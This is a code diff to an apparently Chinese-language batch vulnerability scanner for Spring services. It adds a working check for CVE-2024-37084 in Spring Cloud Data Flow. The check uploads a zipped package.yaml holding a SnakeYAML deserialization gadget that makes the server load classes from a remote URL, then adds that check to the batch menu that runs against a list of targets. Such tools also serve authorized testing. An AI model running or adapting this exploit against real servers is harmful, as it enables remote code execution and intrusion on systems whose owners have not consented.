@@ -4,7 +4,7 @@
  #   AabyssZG   #
 ################
 
-import requests, sys, json, re, random, base64, string
+import requests, sys, json, re, random, base64, string, tempfile, os, zipfile, textwrap
 from termcolor import cprint
 from time import sleep
 import urllib3
@@ -439,7 +439,6 @@ def CVE_2025_41243(url, proxies):
 
 
     try:
-        cprint("[+] 正在发送Payload", "green")
         requests.packages.urllib3.disable_warnings()
         requests.post(url=url + "actuator/gateway/routes/" + random_string, headers=headers1,
                             timeout=outtime, json=payload_json, verify=False, proxies=proxies)
@@ -468,6 +467,90 @@ def CVE_2025_41243(url, proxies):
         f2.write(str(e) + '\n')
         f2.close()
 
+def CVE_2024_37084(url, proxies):
+    Headers_1 = {
+        "User-Agent": random.choice(ua),
+    }
+    Headers_2 = {
+        "User-Agent": random.choice(ua),
+        "Content-Type": "application/json"
+    }
+    try:
+        try:
+            response = requests.get(url + "api/package/", headers=Headers_1, timeout=outtime, verify=False,
+                                    proxies=proxies)
+            response.raise_for_status()
+            data = response.json()
+            upload_href = data.get('_links', {}).get('upload', {}).get('href')
+            install_href = data.get('_links', {}).get('install', {}).get('href')
+            if not upload_href or not install_href:
+                cprint("[-] 目标 " + url + " 验证CVE-2024-37084远程命令执行漏洞不存在", "yellow")
+                return
+        except Exception as e:
+            cprint("[-] 目标 " + url + " 验证CVE-2024-37084远程命令执行漏洞不存在", "yellow")
+            return
+
+        dnslog = "aaa"
+        with tempfile.TemporaryDirectory() as temp_dir:
+            package_dir = os.path.join(temp_dir, "test-1.1.1")
+            os.makedirs(package_dir)
+
+            yaml_file_path = os.path.join(package_dir, "package.yaml")
+            yaml_content = textwrap.dedent(f"""\
+                apiVersion: 1.0.0
+                origin: my origin
+                repositoryId: 12345
+                repositoryName: local
+                kind: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://{dnslog}"]]]]
+                name: test1
+                version: 1.1.1
+            """)
+
+            with open(yaml_file_path, 'w') as f:
+                f.write(yaml_content)
+
+            with zipfile.ZipFile(os.path.join(temp_dir, "test-1.1.1.zip"), 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for root, dirs, files in os.walk(package_dir):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        arcname = os.path.relpath(file_path, temp_dir)
+                        zipf.write(file_path, arcname)
+
+            with open(os.path.join(temp_dir, "test-1.1.1.zip"), 'rb') as f:
+                zip_data = f.read()
+
+            zip_byte_list = [byte for byte in zip_data]
+
+            json_data = {
+                "repoName": "local",
+                "name": "test",
+                "version": "1.1.1",
+                "extension": "zip",
+                "packageFileAsBytes": zip_byte_list
+            }
+
+            response = requests.post(url + "api/package/upload", headers=Headers_2, timeout=outtime, verify=False,
+                                     proxies=proxies, json=json_data)
+
+            data = response.json()
+            if data.get("exception") == "org.yaml.snakeyaml.constructor.ConstructorException":
+                cprint(f'[+] [CVE-2024-37084] {url}', "red")
+                f2 = open("vulout.txt", "a")
+                f2.write("[+] [CVE-2024-37084] " + url + '\n')
+                f2.close()
+            else:
+                cprint("[-] 目标 " + url + " 验证CVE-2024-37084远程命令执行漏洞不存在", "yellow")
+
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
+    except Exception as e:
+        print("[-] 发生错误，已记入日志error.log\n")
+        f2 = open("error.log", "a")
+        f2.write(str(e) + '\n')
+        f2.close()
+
+
 def generate_random_route(length=5):
     characters = string.ascii_letters
     return ''.join(random.choice(characters) for _ in range(length))
@@ -486,6 +569,7 @@ def poc(filename,proxies):
         8: JolokiaRCE,
         9: CVE_2018_1273,
         10: CVE_2025_41243,
+        11: CVE_2024_37084,
     }
     cprint("[+] 获取TXT名字为：" + filename,"green")
     FileRead(filename)
@@ -495,7 +579,7 @@ def poc(filename,proxies):
     try:
         choices = input("\n请输入要批量检测的漏洞 (例子：1,3,5 直接回车即检测全部漏洞): ")
         if choices == '':
-            choices = "1,2,3,4,5,6,7,8,9,10"
+            choices = "1,2,3,4,5,6,7,8,9,10,11"
         choices = [int(choice) for choice in choices.split(',')]
     except Exception as e:
         print("请不要输入无意义的字符串")
